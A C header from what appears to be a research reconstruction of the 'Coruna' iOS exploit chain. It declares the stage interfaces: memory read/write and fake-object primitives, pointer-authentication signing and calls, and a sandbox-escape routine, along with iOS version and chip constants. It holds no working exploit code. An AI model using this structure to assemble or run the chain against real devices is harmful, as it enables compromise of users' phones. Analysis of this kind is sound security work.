/*
 * coruna_stage_contracts.h — Stage1/Stage2/Stage3 API contracts
 *
 * The stable API surface between Coruna's JavaScript stages.
 * Both stage1 (terrorbird, cassowary) and stage2 (seedbell variants)
 * converge on the same output contract.
 *
 * Source: yuzhouheike/iOS-Coruna-Reconstruction (full chain analysis)
 */
#ifndef CORUNA_STAGE_CONTRACTS_H
#define CORUNA_STAGE_CONTRACTS_H

#include <stdint.h>
#include <stddef.h>

/* ==================== Stage1 Output Contract ==================== */

/*
 * Both terrorbird (16.2-16.5.1) and cassowary (16.6-17.2.1) produce
 * the same caller-facing primitive. The corruption strategy differs,
 * but the final API is intentionally unified.
 */
typedef struct {
    /* Address-of: object -> u64 backing pointer */
    uint64_t (*addrof)(void *obj);

    /* Fake-object: u64 address -> JS object */
    void *(*fakeobj)(uint64_t addr);

    /* 64-bit read/write */
    uint64_t (*read64)(uint64_t addr);
    void     (*write64)(uint64_t addr, uint64_t value);

    /* 32-bit read */
    uint32_t (*read32)(uint64_t addr);

    /* Byte read */
    uint8_t  (*readByte)(uint64_t addr);

    /* String read (null-terminated) */
    char    *(*readString)(uint64_t addr);

    /* Typed array / ArrayBuffer pointer extraction */
    uint64_t (*getDataPointer)(void *typed_array_or_buffer);

    /* Get backing store pointer */
    uint64_t (*getBackingStore)(void *typed_array_or_buffer);

    /* Get JIT code pointer for a function */
    uint64_t (*getJITCodePointer)(void *func);

    /* Allocation helpers */
    uint64_t (*allocCString)(const char *str);
    uint64_t (*allocZeroBuffer)(size_t size);
} coruna_stage1_primitive_t;

/* ==================== Stage2 Output Contract ==================== */

/*
 * Both seedbell branches produce the same arm64e PAC-aware sign/auth/call
 * surface. The corruption target is the same (Intl.Segmenter), only the
 * gadget set differs between versions.
 */
typedef struct {
    /* PAC sign/auth operations (ARM64 PAC instructions) */
    uint64_t (*pacda)(uint64_t ptr, uint64_t modifier);
    uint64_t (*pacia)(uint64_t ptr, uint64_t modifier);
    uint64_t (*autda)(uint64_t ptr, uint64_t modifier);
    uint64_t (*autia)(uint64_t ptr, uint64_t modifier);

    /* PAC-signed indirect call (up to 8 arguments) */
    uint64_t (*callSigned)(void *fn,
                            uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
                            uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
} coruna_stage2_pac_t;

/* ==================== Stage3 Container Contract ==================== */

/*
 * The JS Stage3_VariantB rebuilds a 0xF00DBEEF container from manifest.json
 * and serves it to the native bootstrap via the shared buffer.
 */
/* Stage3's JS-rebuilt view of the 0xF00DBEEF container.
 * NOTE: named coruna_stage3_* (not coruna_container_*) because
 * coruna_record_contracts.h defines the wire-format structs
 * coruna_container_header_t / coruna_container_entry_t with different
 * layouts - including both headers previously caused redefinition errors.
 */
typedef struct {
    uint32_t magic;       /* 0xF00DBEEF */
    uint32_t count;       /* number of entries */
} coruna_stage3_container_header_t;

typedef struct {
    uint32_t f1;          /* logical record ID (0x10000-0xF0000) */
    uint32_t f2;          /* observed 3 in modern sets */
    uint32_t data_offset; /* offset to record data in container */
    uint32_t size;        /* actual fetched byte count */
} coruna_stage3_container_entry_t;

/* Stage3 functions (from Stage3_VariantB.js) */
typedef struct {
    /* Fetch and rewrite URLs (e.g. /entry2_type0x0f.dylib -> local TweakLoader) */
    int (*fetchBin)(const char *url, uint8_t **out_data, size_t *out_size);

    /* Rebuild 0xF00DBEEF container from manifest.json */
    int (*buildContainer)(const char *manifest_path,
                            coruna_stage3_container_header_t **out_container,
                            size_t *out_size);

    /* Copy container into shared buffer */
    int (*feedRawBuffer)(const uint8_t *data, size_t size);

    /* Service native requests (read string, rebuild, write response) */
    int (*wA)(const char *request, const char *secondary,
               uint8_t **out_data, size_t *out_size);

    /* Map bootstrap.dylib, patch _process branch, invoke */
    int (*executeSandboxEscape)(void);
} coruna_stage3_ops_t;

/* ==================== MachO Parser Classes (JS) ==================== */

/*
 * From NadSec analysis: 4 classes implementing a complete Mach-O parser
 * and dyld shared cache walker in pure JavaScript.
 *   - tt: Parsed Mach-O container
 *   - rt: Segment-relative resolver
 *   - et: Virtual address resolver
 *   - nt: Dyld shared cache walker
 *
 * JS Mach-O walker lives in Stage3; Python port is Framework/payloads lab only.
 */

/* ==================== Version-Specific Constants ==================== */

/* Kernel version thresholds (XNU major version) */
#define CORUNA_XNU_13X   6153   /* iOS 13.x / Darwin 19 */
#define CORUNA_XNU_14X   7195   /* iOS 14.x / Darwin 20 */
#define CORUNA_XNU_15X   8019   /* iOS 15.x / Darwin 21 */
#define CORUNA_XNU_16X   8792   /* iOS 16.x / Darwin 22 */
#define CORUNA_XNU_17X   10002  /* iOS 17.x / Darwin 23 */

/* SoC family constants (from sysctl hw.cpufamily) */
#define CORUNA_CPUFAMILY_A14    -1829029944   /* Lightning/Thunder */
#define CORUNA_CPUFAMILY_A15    458787763     /* Blizzard/Avalanche */
#define CORUNA_CPUFAMILY_A16    -2023363094   /* Everest/Sawtooth */
#define CORUNA_CPUFAMILY_A17    678884788     /* A17 Pro */

/* Stage1 anchor lines in our JS dumps */
#define CORUNA_STAGE1_TERRORBIRD_ADDROF_LINE     67
#define CORUNA_STAGE1_TERRORBIRD_FAKEOBJ_LINE    132
#define CORUNA_STAGE1_CASSOWARY_VERSIONS_TABLE  73
#define CORUNA_STAGE1_CASSOWARY_WORKER_REPAIR   965
#define CORUNA_STAGE1_CASSOWARY_PRIMITIVE_INSTALL 1050

/* Stage2 anchor lines */
#define CORUNA_STAGE2_SEGMENTER_OFFSETS_LINE   734
#define CORUNA_STAGE2_GADGET_DISCOVERY_LINE  1219
#define CORUNA_STAGE2_BREAKITER_CORRUPTION   347
#define CORUNA_STAGE2_WASM_TRAMPOLINE        464

#endif /* CORUNA_STAGE_CONTRACTS_H */
